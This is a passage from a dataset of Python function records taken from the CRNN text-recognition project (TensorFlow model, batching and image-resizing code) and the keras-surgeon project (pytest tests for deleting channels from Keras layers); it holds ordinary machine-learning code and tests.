                print(ground_truth_to_word(decoded[i], self.CHAR_VECTOR))
    return None"
Belval/CRNN,save_frozen_model,"def save_frozen_model(self, path=None, optimize=False, input_nodes=['input', 'seq_len'], output_nodes=['dense_decoded']):
    if not path or len(path) == 0:
        raise ValueError('Save path for frozen model is not specified')
    tf.train.write_graph(self.session.graph_def, '/'.join(path.split('/')[0:-1]), path.split('/')[-1] + '.pbtxt')
    output_graph_def = tf.graph_util.convert_variables_to_constants(self.session, self.session.graph.as_graph_def(), output_nodes)
    if optimize:
        output_graph_def = optimize_for_inference_lib.optimize_for_inference(output_graph_def, input_nodes, output_nodes, tf.float32.as_datatype_enum)
    with open(path, 'wb') as f:
        f.write(output_graph_def.SerializeToString())
    return True"
Belval/CRNN,BidirectionnalRNN,"def BidirectionnalRNN(inputs, seq_len):
    """"""
                Bidirectionnal LSTM Recurrent Neural Network part
            """"""
    with tf.variable_scope(None, default_name='bidirectional-rnn-1'):
        lstm_fw_cell_1 = rnn.BasicLSTMCell(256)
        lstm_bw_cell_1 = rnn.BasicLSTMCell(256)
        (inter_output, _) = tf.nn.bidirectional_dynamic_rnn(lstm_fw_cell_1, lstm_bw_cell_1, inputs, seq_len, dtype=tf.float32)
        inter_output = tf.concat(inter_output, 2)
    with tf.variable_scope(None, default_name='bidirectional-rnn-2'):
        lstm_fw_cell_2 = rnn.BasicLSTMCell(256)
        lstm_bw_cell_2 = rnn.BasicLSTMCell(256)
        (outputs, _) = tf.nn.bidirectional_dynamic_rnn(lstm_fw_cell_2, lstm_bw_cell_2, inter_output, seq_len, dtype=tf.float32)
        outputs = tf.concat(outputs, 2)
    return outputs"
Belval/CRNN,CNN,"def CNN(inputs):
    """"""
                Convolutionnal Neural Network part
            """"""
    conv1 = tf.layers.conv2d(inputs=inputs, filters=64, kernel_size=(3, 3), padding='same', activation=tf.nn.relu)
    pool1 = tf.layers.max_pooling2d(inputs=conv1, pool_size=[2, 2], strides=2)
    conv2 = tf.layers.conv2d(inputs=pool1, filters=128, kernel_size=(3, 3), padding='same', activation=tf.nn.relu)
    pool2 = tf.layers.max_pooling2d(inputs=conv2, pool_size=[2, 2], strides=2)
    conv3 = tf.layers.conv2d(inputs=pool2, filters=256, kernel_size=(3, 3), padding='same', activation=tf.nn.relu)
    bnorm1 = tf.layers.batch_normalization(conv3)
    conv4 = tf.layers.conv2d(inputs=bnorm1, filters=256, kernel_size=(3, 3), padding='same', activation=tf.nn.relu)
    pool3 = tf.layers.max_pooling2d(inputs=conv4, pool_size=[2, 2], strides=[1, 2], padding='same')
    conv5 = tf.layers.conv2d(inputs=pool3, filters=512, kernel_size=(3, 3), padding='same', activation=tf.nn.relu)
    bnorm2 = tf.layers.batch_normalization(conv5)
    conv6 = tf.layers.conv2d(inputs=bnorm2, filters=512, kernel_size=(3, 3), padding='same', activation=tf.nn.relu)
    pool4 = tf.layers.max_pooling2d(inputs=conv6, pool_size=[2, 2], strides=[1, 2], padding='same')
    conv7 = tf.layers.conv2d(inputs=pool4, filters=512, kernel_size=(2, 2), padding='valid', activation=tf.nn.relu)
    return conv7"
Belval/CRNN,__init__,"def __init__(self, batch_size, model_path, examples_path, max_image_width, train_test_ratio, max_char_count, char_vector, use_trdg, language):
    if train_test_ratio > 1.0 or train_test_ratio < 0:
        raise Exception('Incoherent ratio!')
    self.char_vector = char_vector
    self.train_test_ratio = train_test_ratio
    self.max_image_width = max_image_width
    self.batch_size = batch_size
    self.model_path = model_path
    self.current_train_offset = 0
    self.examples_path = examples_path
    self.max_char_count = max_char_count
    self.use_trdg = use_trdg
    self.language = language
    if self.use_trdg:
        self.train_batches = self.multiprocess_batch_generator()
        self.test_batches = self.multiprocess_batch_generator()
    else:
        (self.data, self.data_len) = self.load_data()
        self.test_offset = int(train_test_ratio * self.data_len)
        self.current_test_offset = self.test_offset
        self.train_batches = self.generate_all_train_batches()
        self.test_batches = self.generate_all_test_batches()"
Belval/CRNN,batch_generator,"def batch_generator(self, queue):
    """"""Takes a queue and enqueue batches in it
        """"""
    generator = GeneratorFromDict(language=self.language)
    while True:
        batch = []
        while len(batch) < self.batch_size:
            (img, lbl) = generator.next()
            batch.append((resize_image(np.array(img.convert('L')), self.max_image_width)[0], lbl, label_to_array(lbl, self.char_vector)))
        (raw_batch_x, raw_batch_y, raw_batch_la) = zip(*batch)
        batch_y = np.reshape(np.array(raw_batch_y), -1)
        batch_dt = sparse_tuple_from(np.reshape(np.array(raw_batch_la), -1))
        raw_batch_x = np.swapaxes(raw_batch_x, 1, 2)
        raw_batch_x = raw_batch_x / 255.0
        batch_x = np.reshape(np.array(raw_batch_x), (len(raw_batch_x), self.max_image_width, 32, 1))
        if queue.qsize() < 20:
            queue.put((batch_y, batch_dt, batch_x))
        else:
            pass"
Belval/CRNN,multiprocess_batch_generator,"def multiprocess_batch_generator(self):
    """"""Returns a batch generator to use in training
        """"""
    q = Queue()
    processes = []
    for i in range(2):
        processes.append(Process(target=self.batch_generator, args=(q,)))
        processes[-1].start()
    while True:
        yield q.get()"
Belval/CRNN,load_data,"def load_data(self):
    """"""Load all the images in the folder
        """"""
    print('Loading data')
    examples = []
    count = 0
    skipped = 0
    for f in os.listdir(self.examples_path):
        if len(f.split('_')[0]) > self.max_char_count:
            continue
        (arr, initial_len) = resize_image(imread(os.path.join(self.examples_path, f), mode='L'), self.max_image_width)
        examples.append((arr, f.split('_')[0], label_to_array(f.split('_')[0], self.char_vector)))
        count += 1
    return (examples, len(examples))"
Belval/CRNN,generate_all_train_batches,"def generate_all_train_batches(self):
    train_batches = []
    while not self.current_train_offset + self.batch_size > self.test_offset:
        old_offset = self.current_train_offset
        new_offset = self.current_train_offset + self.batch_size
        self.current_train_offset = new_offset
        (raw_batch_x, raw_batch_y, raw_batch_la) = zip(*self.data[old_offset:new_offset])
        batch_y = np.reshape(np.array(raw_batch_y), -1)
        batch_dt = sparse_tuple_from(np.reshape(np.array(raw_batch_la), -1))
        raw_batch_x = np.swapaxes(raw_batch_x, 1, 2)
        raw_batch_x = raw_batch_x / 255.0
        batch_x = np.reshape(np.array(raw_batch_x), (len(raw_batch_x), self.max_image_width, 32, 1))
        train_batches.append((batch_y, batch_dt, batch_x))
    return train_batches"
Belval/CRNN,generate_all_test_batches,"def generate_all_test_batches(self):
    test_batches = []
    while not self.current_test_offset + self.batch_size > self.data_len:
        old_offset = self.current_test_offset
        new_offset = self.current_test_offset + self.batch_size
        self.current_test_offset = new_offset
        (raw_batch_x, raw_batch_y, raw_batch_la) = zip(*self.data[old_offset:new_offset])
        batch_y = np.reshape(np.array(raw_batch_y), -1)
        batch_dt = sparse_tuple_from(np.reshape(np.array(raw_batch_la), -1))
        raw_batch_x = np.swapaxes(raw_batch_x, 1, 2)
        raw_batch_x = raw_batch_x / 255.0
        batch_x = np.reshape(np.array(raw_batch_x), (len(raw_batch_x), self.max_image_width, 32, 1))
        test_batches.append((batch_y, batch_dt, batch_x))
    return test_batches"
Belval/CRNN,parse_arguments,"def parse_arguments():
    """"""
        Parse the command line arguments of the program.
    """"""
    parser = argparse.ArgumentParser(description='Train or test the CRNN model.')
    parser.add_argument('--train', action='store_true', help='Define if we train the model')
    parser.add_argument('--test', action='store_true', help='Define if we test the model')
    parser.add_argument('-ttr', '--train_test_ratio', type=float, nargs='?', help='How the data will be split between training and testing', default=0.7)
    parser.add_argument('-m', '--model_path', type=str, nargs='?', help='The path where the pretrained model can be found or where the model will be saved', default='./save/')
    parser.add_argument('-ex', '--examples_path', type=str, nargs='?', help='The path to the file containing the examples (training samples)')
    parser.add_argument('-bs', '--batch_size', type=int, nargs='?', help='Size of a batch', default=64)
    parser.add_argument('-it', '--iteration_count', type=int, nargs='?', help='How many iteration in training', default=10)
    parser.add_argument('-miw', '--max_image_width', type=int, nargs='?', help='Maximum width of an example before truncating', default=100)
    parser.add_argument('-r', '--restore', action='store_true', help='Define if we try to load a checkpoint file from the save folder')
    parser.add_argument('-cs', '--char_set_string', type=str, nargs='?', help='The charset string', default=CHAR_VECTOR)
    parser.add_argument('--use_trdg', action='store_true', help='Generate training data on the fly with TextRecognitionDataGenerator')
    parser.add_argument('-l', '--language', type=str, nargs='?', help='Language to use with TRDG (Must be used with --use_trdg', default='en')
    return parser.parse_args()"
Belval/CRNN,main,"def main():
    """"""
        Entry point when using CRNN from the commandline
    """"""
    args = parse_arguments()
    if not args.train and (not args.test):
        print('If we are not training, and not testing, what is the point?')
    crnn = None
    if args.train:
        crnn = CRNN(args.batch_size, args.model_path, args.examples_path, args.max_image_width, args.train_test_ratio, args.restore, args.char_set_string, args.use_trdg, args.language)
        crnn.train(args.iteration_count)
    if args.test:
        if crnn is None:
            crnn = CRNN(args.batch_size, args.model_path, args.examples_path, args.max_image_width, 0, args.restore, args.char_set_string, args.use_trdg, args.language)
        crnn.test()"
Belval/CRNN,sparse_tuple_from,"def sparse_tuple_from(sequences, dtype=np.int32):
    """"""
        Inspired (copied) from https://github.com/igormq/ctc_tensorflow_example/blob/master/utils.py
    """"""
    indices = []
    values = []
    for (n, seq) in enumerate(sequences):
        indices.extend(zip([n] * len(seq), [i for i in range(len(seq))]))
        values.extend(seq)
    indices = np.asarray(indices, dtype=np.int64)
    values = np.asarray(values, dtype=dtype)
    shape = np.asarray([len(sequences), np.asarray(indices).max(0)[1] + 1], dtype=np.int64)
    return (indices, values, shape)"
Belval/CRNN,resize_image,"def resize_image(im_arr, input_width):
    """"""Resize an image to the ""good"" input size
    """"""
    (r, c) = np.shape(im_arr)
    if c > input_width:
        c = input_width
        ratio = float(input_width) / c
        final_arr = imresize(im_arr, (int(32 * ratio), input_width))
    else:
        final_arr = np.zeros((32, input_width))
        ratio = 32.0 / r
        im_arr_resized = imresize(im_arr, (32, int(c * ratio)))
        final_arr[:, 0:min(input_width, np.shape(im_arr_resized)[1])] = im_arr_resized[:, 0:input_width]
    return (final_arr, c)"
Belval/CRNN,label_to_array,"def label_to_array(label, char_vector):
    try:
        return [char_vector.index(x) for x in label]
    except Exception as ex:
        print(label)
        raise ex"
Belval/CRNN,ground_truth_to_word,"def ground_truth_to_word(ground_truth, char_vector):
    """"""
        Return the word string based on the input ground_truth
    """"""
    try:
        return ''.join([char_vector[i] for i in ground_truth if i != -1])
    except Exception as ex:
        print(ground_truth)
        print(ex)
        input()"
Belval/CRNN,levenshtein,"def levenshtein(s1, s2):
    if len(s1) < len(s2):
        return levenshtein(s2, s1)
    if len(s2) == 0:
        return len(s1)
    previous_row = range(len(s2) + 1)
    for (i, c1) in enumerate(s1):
        current_row = [i + 1]
        for (j, c2) in enumerate(s2):
            insertions = previous_row[j + 1] + 1
            deletions = current_row[j] + 1
            substitutions = previous_row[j] + (c1 != c2)
            current_row.append(min(insertions, deletions, substitutions))
        previous_row = current_row
    return previous_row[-1]"
BenWhetton/keras-surgeon,clear_tf,"@pytest.fixture(autouse=True)
def clear_tf():
    yield
    K.clear_session()
    tf.compat.v1.reset_default_graph()"
BenWhetton/keras-surgeon,data_format,"@pytest.fixture(params=['channels_first', 'channels_last'])
def data_format(request):
    return request.param"
BenWhetton/keras-surgeon,channel_index,"@pytest.fixture(params=[[0], [-1], [1, 2]], ids=str)
def channel_index(request):
    return request.param"
BenWhetton/keras-surgeon,model_2,"@pytest.fixture
def model_2():
    """"""Basic Lenet-style model test fixture with minimal channels""""""
    model = Sequential()
    model.add(Conv2D(2, [3, 3], input_shape=[28, 28, 1], data_format='channels_last', activation='relu'))
    model.add(Conv2D(2, [3, 3], activation='relu'))
    model.add(Flatten())
    model.add(Dense(2, activation='relu'))
    model.add(Dense(10, activation='relu'))
    return Model(model.inputs, model.outputs)"
BenWhetton/keras-surgeon,test_rebuild_submodel,"def test_rebuild_submodel(model_2):
    output_nodes = []
    for output in model_2.outputs:
        (layer, node_index, tensor_index) = output._keras_history
        output_nodes.append(layer.inbound_nodes[node_index])
    surgeon = Surgeon(model_2)
    (outputs, _) = surgeon._rebuild_graph(model_2.inputs, output_nodes)
    new_model = Model(model_2.inputs, outputs)
    assert compare_models(model_2, new_model)"
BenWhetton/keras-surgeon,test_delete_channels_rec_1,"def test_delete_channels_rec_1():
    inputs = Input(shape=(784,))
    x = Dense(64, activation='relu')(inputs)
    x = Dense(64, activation='relu')(x)
    predictions = Dense(10, activation='softmax')(x)
    model = Model(inputs=inputs, outputs=predictions)
    model.compile(optimizer='rmsprop', loss='categorical_crossentropy', metrics=['accuracy'])
    operations.delete_channels(model, model.layers[2], [0])"
BenWhetton/keras-surgeon,model_3,"def model_3(data_format):
    if data_format is 'channels_last':
        main_input = Input(shape=[7, 7, 1])
    elif data_format is 'channels_first':
        main_input = Input(shape=[1, 7, 7])
    else:
        raise ValueError(data_format + ' is not a valid ""data_format"" value.')
    x = Conv2D(3, [3, 3], data_format=data_format)(main_input)
    x = Conv2D(3, [3, 3], data_format=data_format)(x)
    x = Flatten()(x)
    x = Dense(3)(x)
    main_output = Dense(1)(x)
    model = Model(inputs=main_input, outputs=main_output)
    w1 = [np.asarray([[[[1, 2, 3]], [[4, 5, 6]], [[7, 8, 9]]], [[[10, 11, 12]], [[13, 14, 15]], [[16, 17, 18]]], [[[19, 20, 21]], [[22, 23, 24]], [[25, 26, 27]]]], dtype='float32'), np.asarray([100, 200, 300], dtype='float32')]
    model.layers[1].set_weights(w1)
    w2 = [np.reshape(np.arange(0, 3 * 3 * 3 * 3, dtype='float32'), [3, 3, 3, 3]), np.asarray([100, 200, 300], dtype='float32')]
    model.layers[2].set_weights(w2)
    w4 = [np.reshape(np.arange(0, 3 * 3 * 3 * 3, dtype='float32'), [3 * 3 * 3, 3]), np.asarray([100, 200, 300], dtype='float32')]
    model.layers[4].set_weights(w4)
    model.compile(optimizer='rmsprop', loss='categorical_crossentropy', metrics=['accuracy'])
    return model"
BenWhetton/keras-surgeon,model_4,"def model_4(data_format):
    if data_format is 'channels_last':
        main_input = Input(shape=[2, 2, 1])
    elif data_format is 'channels_first':
        main_input = Input(shape=[1, 2, 2])
    else:
        raise ValueError(data_format + ' is not a valid ""data_format"" value.')
    x = Conv2D(3, [3, 3], data_format=data_format, padding='same')(main_input)
    x = Conv2D(3, [3, 3], data_format=data_format, padding='same')(x)
    x = Flatten()(x)
    x = Dense(3)(x)
    main_output = Dense(1)(x)
    model = Model(inputs=main_input, outputs=main_output)
    w1 = [np.asarray([[[[1, 2, 3]], [[4, 5, 6]], [[7, 8, 9]]], [[[10, 11, 12]], [[13, 14, 15]], [[16, 17, 18]]], [[[19, 20, 21]], [[22, 23, 24]], [[25, 26, 27]]]], dtype='float32'), np.asarray([100, 200, 300], dtype='float32')]
    model.layers[1].set_weights(w1)
    w2 = [np.reshape(np.arange(0, 3 * 3 * 3 * 3, dtype='float32'), [3, 3, 3, 3]), np.asarray([100, 200, 300], dtype='float32')]
    model.layers[2].set_weights(w2)
    w4 = [np.reshape(np.arange(0, 2 * 2 * 3 * 3, dtype='float32'), [2 * 2 * 3, 3]), np.asarray([100, 200, 300], dtype='float32')]
    model.layers[4].set_weights(w4)
    model.compile(optimizer='rmsprop', loss='categorical_crossentropy', metrics=['accuracy'])
    return model"
BenWhetton/keras-surgeon,test_delete_channels_conv2d_conv2d,"def test_delete_channels_conv2d_conv2d(channel_index, data_format):
    model = model_3(data_format)
    layer_index = 1
    new_model = operations.delete_channels(model, model.layers[layer_index], channel_index, copy=True)
    channel_count = model.layers[layer_index].filters
    channel_index = [i % channel_count for i in channel_index]
    w = model.layers[layer_index].get_weights()
    correct_w = [np.delete(w[0], channel_index, axis=-1), np.delete(w[1], channel_index, axis=0)]
    new_w = new_model.layers[layer_index].get_weights()
    assert weights_equal(correct_w, new_w)"
BenWhetton/keras-surgeon,test_delete_channels_conv2d_conv2d_small_shape,"def test_delete_channels_conv2d_conv2d_small_shape():
    model = model_4('channels_last')
    layer_index = 1
    channel_index = [0]
    new_model = operations.delete_channels(model, model.layers[layer_index], channel_index, copy=True)
    channel_count = model.layers[layer_index].filters
    channel_index = [i % channel_count for i in channel_index]
    w = model.layers[layer_index].get_weights()
    correct_w = [np.delete(w[0], channel_index, axis=-1), np.delete(w[1], channel_index, axis=0)]
    new_w = new_model.layers[layer_index].get_weights()
    assert weights_equal(correct_w, new_w)"
BenWhetton/keras-surgeon,test_delete_channels_conv2d_conv2d_next_layer,"def test_delete_channels_conv2d_conv2d_next_layer(channel_index, data_format):
    model = model_3(data_format)
    layer_index = 1
    next_layer_index = 2
    new_model = operations.delete_channels(model, model.layers[layer_index], channel_index)
    channel_count = model.layers[layer_index].filters
    channel_index = [i % channel_count for i in channel_index]
    w = model.layers[next_layer_index].get_weights()
    correct_w = [np.delete(w[0], channel_index, axis=-2), w[1]]
    new_w = new_model.layers[next_layer_index].get_weights()
    assert weights_equal(correct_w, new_w)"
BenWhetton/keras-surgeon,test_delete_channels_flatten,"def test_delete_channels_flatten(channel_index, data_format):
    main_input = Input(shape=list(random.randint(4, 10, size=3)))
    x = Conv2D(3, [3, 3], data_format=data_format)(main_input)
    x = Flatten()(x)
    main_output = Dense(5)(x)
    model = Model(inputs=main_input, outputs=main_output)
    layer_index = 1
    next_layer_index = 3
    layer = model.layers[layer_index]
    new_model = operations.delete_channels(model, layer, channel_index)
    new_w = new_model.layers[next_layer_index].get_weights()
    flat_sz = np.prod(layer.output_shape[1:])
    channel_count = getattr(layer, utils.get_channels_attr(layer))
    channel_index = [i % channel_count for i in channel_index]
    if data_format == 'channels_first':
        delete_indices = [x * flat_sz // channel_count + i for x in channel_index for i in range(0, flat_sz // channel_count)]
    elif data_format == 'channels_last':
        delete_indices = [x + i for i in range(0, flat_sz, channel_count) for x in channel_index]
    else:
        raise ValueError
    correct_w = model.layers[next_layer_index].get_weights()
    correct_w[0] = np.delete(correct_w[0], delete_indices, axis=0)
    assert weights_equal(correct_w, new_w)"
BenWhetton/keras-surgeon,test_delete_channels_maxpooling1d,"def test_delete_channels_maxpooling1d(channel_index):
    layer = MaxPool1D(2)
    layer_test_helper_flatten_1d(layer, channel_index)"
BenWhetton/keras-surgeon,test_delete_channels_cropping1d,"def test_delete_channels_cropping1d(channel_index):
    layer = Cropping1D(3)
    layer_test_helper_flatten_1d(layer, channel_index)"
BenWhetton/keras-surgeon,test_delete_channels_upsampling1d,"def test_delete_channels_upsampling1d(channel_index):
    layer = UpSampling1D(3)
    layer_test_helper_flatten_1d(layer, channel_index)"
BenWhetton/keras-surgeon,test_delete_channels_zeropadding1d,"def test_delete_channels_zeropadding1d(channel_index):
    layer = ZeroPadding1D(3)
    layer_test_helper_flatten_1d(layer, channel_index)"
BenWhetton/keras-surgeon,test_delete_channels_averagepooling1d,"def test_delete_channels_averagepooling1d(channel_index):
    layer = AveragePooling1D(3)
    layer_test_helper_flatten_1d(layer, channel_index)"
BenWhetton/keras-surgeon,test_delete_channels_globalaveragepooling1d,"def test_delete_channels_globalaveragepooling1d(channel_index):
    layer = GlobalAveragePooling1D()
    layer_test_helper_1d_global(layer, channel_index)"
BenWhetton/keras-surgeon,test_delete_channels_maxpooling2d,"def test_delete_channels_maxpooling2d(channel_index, data_format):
    layer = MaxPool2D([2, 2], data_format=data_format)
    layer_test_helper_flatten_2d(layer, channel_index, data_format)"
BenWhetton/keras-surgeon,test_delete_channels_cropping2d,"def test_delete_channels_cropping2d(channel_index, data_format):
    layer = Cropping2D([2, 3], data_format=data_format)
    layer_test_helper_flatten_2d(layer, channel_index, data_format)"
BenWhetton/keras-surgeon,test_delete_channels_upsampling2d,"def test_delete_channels_upsampling2d(channel_index, data_format):
    layer = UpSampling2D([2, 3], data_format=data_format)
    layer_test_helper_flatten_2d(layer, channel_index, data_format)"
BenWhetton/keras-surgeon,test_delete_channels_zeropadding2d,"def test_delete_channels_zeropadding2d(channel_index, data_format):
    layer = ZeroPadding2D([2, 3], data_format=data_format)
    layer_test_helper_flatten_2d(layer, channel_index, data_format)"
BenWhetton/keras-surgeon,test_delete_channels_averagepooling2d,"def test_delete_channels_averagepooling2d(channel_index, data_format):
    layer = AveragePooling2D([2, 3], data_format=data_format)
    layer_test_helper_flatten_2d(layer, channel_index, data_format)"
BenWhetton/keras-surgeon,test_delete_channels_globalaveragepooling2d,"def test_delete_channels_globalaveragepooling2d(channel_index, data_format):
    layer = GlobalAveragePooling2D(data_format=data_format)
    layer_test_helper_2d_global(layer, channel_index, data_format)"
BenWhetton/keras-surgeon,test_delete_channels_maxpooling3d,"def test_delete_channels_maxpooling3d(channel_index, data_format):
    layer = MaxPool3D([2, 3, 2], data_format=data_format)
    layer_test_helper_flatten_3d(layer, channel_index, data_format=data_format)"
BenWhetton/keras-surgeon,test_delete_channels_cropping3d,"def test_delete_channels_cropping3d(channel_index, data_format):
    layer = Cropping3D([2, 3, 2], data_format=data_format)
    layer_test_helper_flatten_3d(layer, channel_index, data_format=data_format)"
BenWhetton/keras-surgeon,test_delete_channels_upsampling3d,"def test_delete_channels_upsampling3d(channel_index, data_format):
    layer = UpSampling3D([2, 3, 2], data_format=data_format)
    layer_test_helper_flatten_3d(layer, channel_index, data_format=data_format)"
BenWhetton/keras-surgeon,test_delete_channels_zeropadding3d,"def test_delete_channels_zeropadding3d(channel_index, data_format):
    layer = ZeroPadding3D([2, 3, 2], data_format=data_format)
    layer_test_helper_flatten_3d(layer, channel_index, data_format=data_format)"
BenWhetton/keras-surgeon,test_delete_channels_averagepooling3d,"def test_delete_channels_averagepooling3d(channel_index, data_format):
    layer = AveragePooling3D([2, 3, 2], data_format=data_format)
    layer_test_helper_flatten_3d(layer, channel_index, data_format=data_format)"
BenWhetton/keras-surgeon,test_delete_channels_merge_concatenate,"def test_delete_channels_merge_concatenate(channel_index, data_format):
    if data_format == 'channels_first':
        axis = 1
    elif data_format == 'channels_last':
        axis = -1
    else:
        raise ValueError
    input_shape = list(random.randint(10, 20, size=3))
    input_1 = Input(shape=input_shape)
    input_2 = Input(shape=input_shape)
    x = Conv2D(3, [3, 3], data_format=data_format, name='conv_1')(input_1)
    y = Conv2D(3, [3, 3], data_format=data_format, name='conv_2')(input_2)
    x = Concatenate(axis=axis, name='cat_1')([x, y])
    x = Flatten()(x)
    main_output = Dense(5, name='dense_1')(x)
    model = Model(inputs=[input_1, input_2], outputs=main_output)
    old_w = model.get_layer('dense_1').get_weights()
    layer = model.get_layer('cat_1')
    del_layer = model.get_layer('conv_1')
    surgeon = Surgeon(model, copy=True)
    surgeon.add_job('delete_channels', del_layer, channels=channel_index)
    new_model = surgeon.operate()
    new_w = new_model.get_layer('dense_1').get_weights()
    flat_sz = np.prod(layer.get_output_shape_at(0)[1:])
    channel_count = getattr(del_layer, utils.get_channels_attr(del_layer))
    channel_index = [i % channel_count for i in channel_index]
    if data_format == 'channels_first':
        delete_indices = [x * flat_sz // 2 // channel_count + i for x in channel_index for i in range(0, flat_sz // 2 // channel_count)]
    elif data_format == 'channels_last':
        delete_indices = [x + i for i in range(0, flat_sz, channel_count * 2) for x in channel_index]
    else:
        raise ValueError
    correct_w = model.get_layer('dense_1').get_weights()
    correct_w[0] = np.delete(correct_w[0], delete_indices, axis=0)
    assert weights_equal(correct_w, new_w)"
BenWhetton/keras-surgeon,test_delete_channels_merge_others,"def test_delete_channels_merge_others(channel_index, data_format):
    layer_test_helper_merge_2d(Add(), channel_index, data_format)
    layer_test_helper_merge_2d(Multiply(), channel_index, data_format)
    layer_test_helper_merge_2d(Average(), channel_index, data_format)
    layer_test_helper_merge_2d(Maximum(), channel_index, data_format)"
BenWhetton/keras-surgeon,test_delete_channels_advanced_activations,"def test_delete_channels_advanced_activations(channel_index, data_format):
    layer_test_helper_flatten_2d(LeakyReLU(), channel_index, data_format)
    layer_test_helper_flatten_2d(ELU(), channel_index, data_format)
    layer_test_helper_flatten_2d(ThresholdedReLU(), channel_index, data_format)
    layer_test_helper_flatten_2d(ReLU(), channel_index, data_format)"
BenWhetton/keras-surgeon,test_delete_channels_noise,"def test_delete_channels_noise(channel_index, data_format):
    layer_test_helper_flatten_2d(GaussianNoise(0.5), channel_index, data_format)
    layer_test_helper_flatten_2d(GaussianDropout(0.5), channel_index, data_format)
    layer_test_helper_flatten_2d(AlphaDropout(0.5), channel_index, data_format)"
BenWhetton/keras-surgeon,test_delete_channels_simplernn,"def test_delete_channels_simplernn(channel_index):
    layer = SimpleRNN(9, return_sequences=True)
    recursive_test_helper(layer, channel_index)"
BenWhetton/keras-surgeon,test_delete_channels_gru,"def test_delete_channels_gru(channel_index):
    layer = GRU(9, return_sequences=True)
    recursive_test_helper(layer, channel_index)"
BenWhetton/keras-surgeon,test_delete_channels_lstm,"def test_delete_channels_lstm(channel_index):
    layer = LSTM(9, return_sequences=True)
    recursive_test_helper(layer, channel_index)"
BenWhetton/keras-surgeon,test_delete_channels_batchnormalization,"def test_delete_channels_batchnormalization(channel_index, data_format):
    if data_format == 'channels_first':
        axis = 1
    else:
        axis = -1
    layer = BatchNormalization(axis=axis)
    layer_test_helper_flatten_2d(layer, channel_index, data_format)"
BenWhetton/keras-surgeon,recursive_test_helper,"def recursive_test_helper(layer, channel_index):
    main_input = Input(shape=[32, 10])
    x = layer(main_input)
    x = GRU(4, return_sequences=False)(x)
    main_output = Dense(5)(x)
    model = Model(inputs=main_input, outputs=main_output)
    del_layer_index = 1
    next_layer_index = 2
    del_layer = model.layers[del_layer_index]
    new_model = operations.delete_channels(model, del_layer, channel_index)
    new_w = new_model.layers[next_layer_index].get_weights()
    channel_count = getattr(del_layer, utils.get_channels_attr(del_layer))
    channel_index = [i % channel_count for i in channel_index]
    correct_w = model.layers[next_layer_index].get_weights()
    correct_w[0] = np.delete(correct_w[0], channel_index, axis=0)
    assert weights_equal(correct_w, new_w)"
BenWhetton/keras-surgeon,layer_test_helper_1d_global,"def layer_test_helper_1d_global(layer, channel_index):
    main_input = Input(shape=list(random.randint(10, 20, size=2)))
    x = Conv1D(3, 3)(main_input)
    x = layer(x)
    main_output = Dense(5)(x)
    model = Model(inputs=main_input, outputs=main_output)
    del_layer_index = 1
    next_layer_index = 3
    del_layer = model.layers[del_layer_index]
    new_model = operations.delete_channels(model, del_layer, channel_index)
    new_w = new_model.layers[next_layer_index].get_weights()
    channel_count = getattr(del_layer, utils.get_channels_attr(del_layer))
    channel_index = [i % channel_count for i in channel_index]
    correct_w = model.layers[next_layer_index].get_weights()
    correct_w[0] = np.delete(correct_w[0], channel_index, axis=0)
    assert weights_equal(correct_w, new_w)"
BenWhetton/keras-surgeon,layer_test_helper_2d_global,"def layer_test_helper_2d_global(layer, channel_index, data_format):
    main_input = Input(shape=list(random.randint(10, 20, size=3)))
    x = Conv2D(3, [3, 3], data_format=data_format)(main_input)
    x = layer(x)
    main_output = Dense(5)(x)
    model = Model(inputs=main_input, outputs=main_output)
    del_layer_index = 1
    next_layer_index = 3
    del_layer = model.layers[del_layer_index]
    new_model = operations.delete_channels(model, del_layer, channel_index)
    new_w = new_model.layers[next_layer_index].get_weights()
    channel_count = getattr(del_layer, utils.get_channels_attr(del_layer))
    channel_index = [i % channel_count for i in channel_index]
    correct_w = model.layers[next_layer_index].get_weights()
    correct_w[0] = np.delete(correct_w[0], channel_index, axis=0)
    assert weights_equal(correct_w, new_w)"
BenWhetton/keras-surgeon,layer_test_helper_flatten_1d,"def layer_test_helper_flatten_1d(layer, channel_index):
    main_input = Input(shape=list(random.randint(10, 20, size=2)))
    x = Conv1D(3, 3)(main_input)
    x = layer(x)
    x = Flatten()(x)
    main_output = Dense(5)(x)
    model = Model(inputs=main_input, outputs=main_output)
    del_layer_index = 1
    next_layer_index = 4
    del_layer = model.layers[del_layer_index]
    surgeon = Surgeon(model)
    surgeon.add_job('delete_channels', del_layer, channels=channel_index)
    new_model = surgeon.operate()
    new_w = new_model.layers[next_layer_index].get_weights()
    flat_sz = np.prod(layer.get_output_shape_at(0)[1:])
    channel_count = getattr(del_layer, utils.get_channels_attr(del_layer))
    channel_index = [i % channel_count for i in channel_index]
    delete_indices = [x + i for i in range(0, flat_sz, channel_count) for x in channel_index]
    correct_w = model.layers[next_layer_index].get_weights()
    correct_w[0] = np.delete(correct_w[0], delete_indices, axis=0)
    assert weights_equal(correct_w, new_w)"
BenWhetton/keras-surgeon,layer_test_helper_flatten_2d,"def layer_test_helper_flatten_2d(layer, channel_index, data_format):
    main_input = Input(shape=list(random.randint(10, 20, size=3)))
    x = Conv2D(3, [3, 3], data_format=data_format)(main_input)
    x = layer(x)
    x = Flatten()(x)
    main_output = Dense(5)(x)
    model = Model(inputs=main_input, outputs=main_output)
    del_layer_index = 1
    next_layer_index = 4
    del_layer = model.layers[del_layer_index]
    surgeon = Surgeon(model)
    surgeon.add_job('delete_channels', del_layer, channels=channel_index)
    new_model = surgeon.operate()
    new_w = new_model.layers[next_layer_index].get_weights()
    flat_sz = np.prod(layer.get_output_shape_at(0)[1:])
    channel_count = getattr(del_layer, utils.get_channels_attr(del_layer))
    channel_index = [i % channel_count for i in channel_index]
    if data_format == 'channels_first':
        delete_indices = [x * flat_sz // channel_count + i for x in channel_index for i in range(0, flat_sz // channel_count)]
    elif data_format == 'channels_last':
        delete_indices = [x + i for i in range(0, flat_sz, channel_count) for x in channel_index]
    else:
        raise ValueError
    correct_w = model.layers[next_layer_index].get_weights()
    correct_w[0] = np.delete(correct_w[0], delete_indices, axis=0)
    assert weights_equal(correct_w, new_w)"
BenWhetton/keras-surgeon,layer_test_helper_flatten_3d,"def layer_test_helper_flatten_3d(layer, channel_index, data_format):
    main_input = Input(shape=list(random.randint(10, 20, size=4)))
    x = Conv3D(3, [3, 3, 2], data_format=data_format)(main_input)
    x = layer(x)
    x = Flatten()(x)
    main_output = Dense(5)(x)
    model = Model(inputs=main_input, outputs=main_output)
    del_layer_index = 1
    next_layer_index = 4
    del_layer = model.layers[del_layer_index]
